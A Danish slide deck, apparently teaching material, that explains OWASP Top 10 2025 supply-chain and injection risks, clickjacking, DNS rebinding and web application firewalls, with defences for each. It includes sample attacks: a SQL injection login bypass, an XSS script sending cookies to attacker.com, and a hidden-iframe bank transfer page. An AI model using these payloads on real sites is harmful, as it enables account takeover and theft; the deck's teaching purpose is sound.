---
marp: true
theme: default
paginate: true
---

# OWASP Web Top 10: A3 og A5

Redegør for hvad OWASP er og redegør for og vis eksempler på sårbarheder i
følgende kategorier i OWASP Web Top 10 2025, samt forklar hvordan man kan sikre
sig mod disse:
A3 Software Supply Chain Failures
A5 Injection (inkl. Cross-Site Scripting og SQL Injection)
Samt redegør for følgende sårbarheder: Clickjacking og DNS Rebind.
Og forklar hvad Web Application Firewalls er og hvad de kan bruges til.

---

### Hvad er OWASP?

- **Open Web Application Security Project**
- Non-profit organisation grundlagt 2001
- Fokus på at forbedre software sikkerhed
- Tilbyder gratis ressourcer, værktøjer og dokumentation
- OWASP Top 10 = industri standard for web sikkerhedsrisici
- Opdateres hvert 3-4 år baseret på data og eksperter

---

### OWASP Top 10 2025 - Overblik

**Nye ændringer i 2025:**

1. A01 - Broken Access Control
2. A02 - Security Misconfiguration
3. **A03 - Software Supply Chain Failures** ⭐ NY
4. A04 - Cryptographic Failures
5. **A05 - Injection**
6. A06 - Insecure Design
7. A07 - Authentication Failures
8. A08 - Software & Data Integrity Failures
9. A09 - Security Logging and Alerting Failures
10. A10 - Mishandling of Exceptional Conditions ⭐ NY

---

### A03: Software Supply Chain Failures

## Hvad er det?

**Definition:** Sårbarheder eller kompromittering i software-udviklingskæden

**Omfatter:**

- Brug af komponenter med kendte sårbarheder
- Kompromitterede build-systemer og CI/CD pipelines
- Malicious packages og dependencies
- Opdateringsmekanismer uden validering
- Uautentificerede tredjepartskomponenter

---

### A03: Angrebsvektorer

**1. Malicious Packages**

- Typosquatting (f.eks. "reqeusts" i stedet for "requests")
- Account takeover af maintainers

**2. Kompromitterede Build Systems**

- SolarWinds (2020): Backdoor i signed updates
- GlassWorm (2025): VS Code Marketplace angreb

**3. Dependency Confusion**

- Public package overtager internal dependency navn

**4. Vulnerable Components**

- Log4Shell (CVE-2021-44228): Kritisk RCE

---

### A03: Eksempel - NPM Økosystemet

**Scenario: Node.js projekt med dependencies**

```bash
$ npm install
...
added 847 packages from 531 contributors

$ npm audit
found 23 vulnerabilities (5 moderate, 18 high)
```

**Problemet:**

- Moderne apps har hundredvis af dependencies
- Transitive dependencies (dependencies af dependencies)
- Én sårbar pakke påvirker hele projektet
- Automatiske opdateringer kan introducere malicious code

**Real eksempler:**

- `event-stream` (2018): Maintainer gav adgang til hacker
- `ua-parser-js` (2021): 8 millioner downloads/uge, hijacked

---

### A03: Sikringsmetoder

**1. Software Bill of Materials (SBOM)**

- Vedligehold komplet oversigt over komponenter
- Track dependencies og transitive dependencies

**2. Verificer og Valider**

- Brug kun trusted sources og signerede packages
- Implementer signature verification
- Check checksums

**3. Kontinuerlig Monitorering**

- Scan for CVEs i dependencies
- Automatiser opdateringer hvor muligt
- Brug SCA (Software Composition Analysis) værktøjer

---

### A03: Sikringsmetoder (fortsat)

**4. Hærdet CI/CD Pipeline**

- Implementer access control og MFA
- Audit logs for alle ændringer
- Isoler build environments
- Principle of least privilege

**5. Developer Security**

- Beskyt developer workstations
- Kontroller IDE extensions
- Security awareness træning
- Code review processer

---

### A05: Injection

## Hvad er det?

**Definition:** Injektion af malicious data/kommandoer i et program

**Typer:**

- **SQL Injection** (SQLi)
- **Cross-Site Scripting** (XSS)
- NoSQL Injection
- OS Command Injection
- LDAP Injection
- Expression Language Injection

**Status:** Faldt fra #3 (2021) til #5 (2025), men stadig kritisk

---

### SQL Injection - Hvordan virker det?

**Usikker kode:**

```java
String query = "SELECT * FROM users WHERE
               username='" + userInput + "'";
```

**Angreb:**
Input: `admin' OR '1'='1`

**Resulterende query:**

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1'
```

**Resultat:** Returnerer alle brugere, bypasser login

---

### Cross-Site Scripting (XSS)

**Definition:** Injektion af malicious scripts i web pages

**Typer:**

**1. Stored XSS:** Script gemmes på serveren

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

**2. Reflected XSS:** Script i URL parameter

```
site.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS:** Client-side manipulation

---

### XSS - Konsekvenser

**Hvad kan en angriber gøre?**

- Stjæle session cookies → Account takeover
- Keylogging
- Phishing attacks
- Defacement af website
- Udfør handlinger som ofret
- Installere malware

**Real-world eksempel:**

- Twitter worm (2010): Clickjacking + XSS spredte sig til 1M+ brugere

---

### A05: Sikringsmetoder

**1. Prepared Statements / Parameterized Queries**

```java
PreparedStatement stmt = conn.prepareStatement(
  "SELECT * FROM users WHERE username = ?");
stmt.setString(1, userInput);
```

**2. Input Validation**

- Whitelist tilgang (accepter kun gyldige tegn)
- Reject suspicious input
- Validate datatype, length, format

---

### A05: Sikringsmetoder (fortsat)

**3. Output Encoding**

- HTML encoding: `<` → `&lt;`
- JavaScript encoding
- URL encoding
- CSS encoding
- Context-aware escaping

**4. Brug Sikre Frameworks**

- Modern frameworks med built-in beskyttelse
- React, Angular: Automatisk XSS protection
- ORM frameworks for database queries

---

### A05: Sikringsmetoder (fortsat)

**5. Content Security Policy (CSP)**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' trusted.cdn.com
```

**6. Principle of Least Privilege**

- Database bruger med minimale rettigheder
- Separate læse/skrive accounts
- Ingen admin rettigheder til app

**7. Testing**

- Static Analysis (SAST)
- Dynamic Analysis (DAST)
- Penetration testing

---

### Clickjacking

## Hvad er det?

**Definition:** UI redress attack - narrer brugere til at klikke på skjulte elementer

**Hvordan:**

1. Angriber laver en falsk/lokkende side
2. Loader target site i transparent iframe
3. Positionerer iframe over lokkende knapper
4. Bruger tror de klikker på én ting, men aktiverer andet

**Også kaldt:** UI redressing

---

### Clickjacking - Eksempel Scenario

**Angribers side:**

```html
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute">
</iframe>
<button>GRATIS iPod! KLIK HER!</button>
```

**Hvad sker der:**

- Bruger ser "GRATIS iPod" knappen
- Klikker på den
- Klikket rammer den skjulte iframe
- Aktiverer "Overfør penge" på bank.com
- Angriber modtager pengene

---

### Clickjacking - Beskyttelse

**1. X-Frame-Options Header**

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

**2. Content Security Policy**

```
Content-Security-Policy:
  frame-ancestors 'none';
  frame-ancestors 'self';
```

**3. SameSite Cookies**

```
Set-Cookie: session=abc123; SameSite=Strict
```

**4. Frame Busting Scripts** (mindre pålidelig)

---

### DNS Rebinding

## Hvad er det?

**Definition:** Angreb der omgår Same-Origin Policy ved at manipulere DNS

**Hvordan det virker:**

1. Bruger besøger evil.com
2. evil.com's DNS returnerer angribers IP
3. Browser loader siden med JavaScript
4. JavaScript laver nye requests til evil.com
5. DNS returnerer nu INTERN IP (f.eks. 192.168.1.1)
6. Browser tillader det (samme domain!)
7. Angriber kan nu tilgå internal netværk

---

### DNS Rebinding - Attack Flow

```
Trin 1: DNS Query for evil.com → 1.2.3.4 (angribers server)
Trin 2: Browser loader JavaScript fra 1.2.3.4
Trin 3: JS laver ny request til evil.com
Trin 4: DNS Query for evil.com → 192.168.1.1 (router)
Trin 5: Browser tillader (samme origin: evil.com)
Trin 6: Angriber kontrollerer router, IoT devices etc.
```

**Nøgle:** Meget kort TTL (0-1 sekund) på DNS record

---

### DNS Rebinding - Mål

**Typiske targets:**

- Home routers med default passwords
- IoT devices (smart thermostats, cameras)
- Internal web applications
- Development servers
- UPnP services

**Konsekvenser:**

- Firewall bypass
- Data exfiltration fra internal network
- Device control (ændre router settings)
- DDoS participation
- De-anonymization (find real IP bag VPN)

---

### DNS Rebinding - Beskyttelse

**1. DNS Validation**

- DNS servers skal filtrere private IP ranges
- Block resolution af eksterne domæner til interne IPs

**2. Host Header Validation**

- Verificer Host header i alle requests
- Reject requests med unexpected hosts

**3. Authentication**

- Kræv autentificering for ALLE services
- Selv på local network

---

### DNS Rebinding - Beskyttelse (fortsat)

**4. HTTPS/TLS**

- Brug HTTPS også på internal services
- Certificate validation hjælper

**5. Browser-level:**

- Implementer Local Network Access spec
- CORS-RFC1918 segmentering

**6. Network Segmentation**

- Isoler IoT devices på separat VLAN
- Firewall rules mellem segmenter

---

### Web Application Firewall (WAF)

## Hvad er det?

**Definition:** Firewall der filtrerer HTTP/HTTPS traffic på applikationslaget (Layer 7)

**Funktion:**

- Analyserer HTTP requests og responses
- Blokerer malicious requests før de når serveren
- Beskytter mod OWASP Top 10 sårbarheder
- Regel-baseret eller ML-baseret detection

**Position:** Mellem klienter og web applikation (reverse proxy)

---

### WAF - Hvordan virker det?

**1. Positive Security Model**

- Whitelist: Tillad kun kendt godt traffic
- Strengere, men kræver mere konfiguration

**2. Negative Security Model**

- Blacklist: Blokér kendt dårligt traffic
- Baseret på signatures og patterns

**3. Hybrid Model**

- Kombination af begge
- Mest almindelig i praksis

---

### WAF - Beskyttelsesmekanismer

**Mod Injection:**

- Pattern matching for SQL syntax
- Script tag detection
- Command injection signatures

**Mod XSS:**

- HTML/JavaScript detection i input
- Output encoding enforcement

**Mod Access Control:**

- Session management validation
- Authentication enforcement
- Rate limiting

---

### WAF - Funktioner

**Core Capabilities:**

- **Protocol Normalization:** Parser HTTP konsistent
- **Real-time Inspection:** Inline analyse (< 5ms latency)
- **Rule-based Policies:** OWASP CRS (Core Rule Set)
- **Signature Detection:** Kendte exploit patterns
- **Behavioral Analysis:** Anomali detection
- **Virtual Patching:** Beskyt uden kode ændringer
- **Logging & Alerting:** SIEM integration

---

### WAF - OWASP Core Rule Set

**ModSecurity CRS:**

- Open-source regel set
- Dækker OWASP Top 10
- Kontinuerligt opdateret
- Community-driven

**Paranoia Levels (PL1-PL4):**

- PL1: Basic protection, færre false positives
- PL4: Maximum protection, flere false positives
- Trade-off mellem sikkerhed og brugervenlighed

---

### WAF - Deployment Options

**1. Cloud-based WAF**

- Hurtig deployment
- Auto-scaling
- DDoS protection included
- Eksempler: Cloudflare, AWS WAF, Azure WAF

**2. On-premise WAF**

- Fuld kontrol
- Lav latency
- Data sovereignty compliance
- Eksempler: F5 BIG-IP, ModSecurity

**3. Hybrid**

- Kombination af cloud og on-prem

---

### WAF - Begrænsninger

**WAF er IKKE en silver bullet:**

- Kan bypasses (encoding tricks, obfuscation)
- False positives kræver tuning
- Kompleks konfiguration
- Performance overhead
- Beskytter ikke mod alle angreb
- Skal kombineres med andre sikkerhedsforanstaltninger

**Best Practice:** Defense in Depth

- Secure coding
- Input validation
- Output encoding
- - WAF som ekstra lag

---

### WAF - Real-world Brug

**PCI DSS Requirement 6.4.2:**

- Kræver automatiserede løsninger til web app sikkerhed
- WAF anbefales specifikt

**Use Cases:**

- E-commerce sites
- Financial applications
- Healthcare portals (HIPAA compliance)
- Government services
- API gateways

**Performance:**

- Enterprise WAFs: 70 Gbps throughput
- < 5ms latency
- Tusinder af requests/sekund

---
